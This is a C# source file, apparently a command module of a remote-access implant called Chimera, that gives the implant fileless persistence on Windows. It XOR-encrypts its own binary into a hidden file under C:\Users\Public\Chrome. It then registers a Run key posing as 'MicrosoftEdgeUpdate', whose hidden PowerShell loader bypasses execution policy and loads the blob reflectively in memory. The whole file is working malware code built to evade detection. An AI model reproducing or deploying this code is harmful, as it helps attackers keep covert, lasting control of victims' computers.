using System;
using System.IO;
using Microsoft.Win32;

namespace Chimera.Commands
{
    // persist — fileless XOR-encrypted persistence
    // 1. XOR-encrypts own binary and writes to staging dir (C:\Users\Public\Chrome\agent.dat)
    // 2. Sets HKCU Run key with a PowerShell one-liner that decrypts and loads
    //    the blob entirely in memory — no unencrypted .exe ever touches disk.
    public static class Persist
    {
        private const string RegKey   = @"Software\Microsoft\Windows\CurrentVersion\Run";
        private const string RegValue = "MicrosoftEdgeUpdate";
        private static readonly string BlobPath = Path.Combine(Staging.Dir, "agent.dat");
        private static readonly byte XorKey = 0x41;

        public static string Execute()
        {
            try
            {
                Staging.EnsureDir();

                string selfPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                byte[] raw = File.ReadAllBytes(selfPath);

                byte[] encrypted = new byte[raw.Length];
                for (int i = 0; i < raw.Length; i++)
                    encrypted[i] = (byte)(raw[i] ^ XorKey);

                File.WriteAllBytes(BlobPath, encrypted);
                File.SetAttributes(BlobPath,
                    File.GetAttributes(BlobPath) | FileAttributes.Hidden);

                // Correctly-escaped PowerShell one-liner — decrypts blob in memory and runs it
                string loader =
                    @"powershell -ep bypass -WindowStyle Hidden -c " +
                    "\"$k=0x41;" +
                    "$d=[IO.File]::ReadAllBytes('" + BlobPath + "');" +
                    "$o=New-Object byte[] $d.Length;" +
                    "for($i=0;$i -lt $d.Length;$i++){$o[$i]=$d[$i]-bxor$k};" +
                    "[Reflection.Assembly]::Load($o).EntryPoint.Invoke($null,@())\"";

                using (RegistryKey key =
                    Registry.CurrentUser.OpenSubKey(RegKey, writable: true))
                {
                    if (key == null) return "[error] Could not open HKCU Run key.";
                    key.SetValue(RegValue, loader, RegistryValueKind.String);
                }

                return "[+] Fileless persistence set.\n" +
                       "    Blob:   " + BlobPath + " (XOR-encrypted, hidden)\n" +
                       "    Reg:    HKCU\\" + RegKey + "\\" + RegValue + "\n" +
                       "    Loader: PowerShell decrypts and loads assembly in memory only.";
            }
            catch (Exception ex)
            {
                return "[error] " + ex.Message;
            }
        }

        public static string Remove()
        {
            var sb = new System.Text.StringBuilder();
            try
            {
                if (File.Exists(BlobPath))
                {
                    File.Delete(BlobPath);
                    sb.AppendLine("[+] Deleted " + BlobPath);
                }
            }
            catch (Exception ex) { sb.AppendLine("[error] " + ex.Message); }
            try
            {
                using (RegistryKey key =
                    Registry.CurrentUser.OpenSubKey(RegKey, writable: true))
                {
                    if (key != null && key.GetValue(RegValue) != null)
                    {
                        key.DeleteValue(RegValue);
                        sb.AppendLine("[+] Removed HKCU Run key.");
                    }
                }
            }
            catch (Exception ex) { sb.AppendLine("[error] " + ex.Message); }
            return sb.ToString();
        }
    }
}
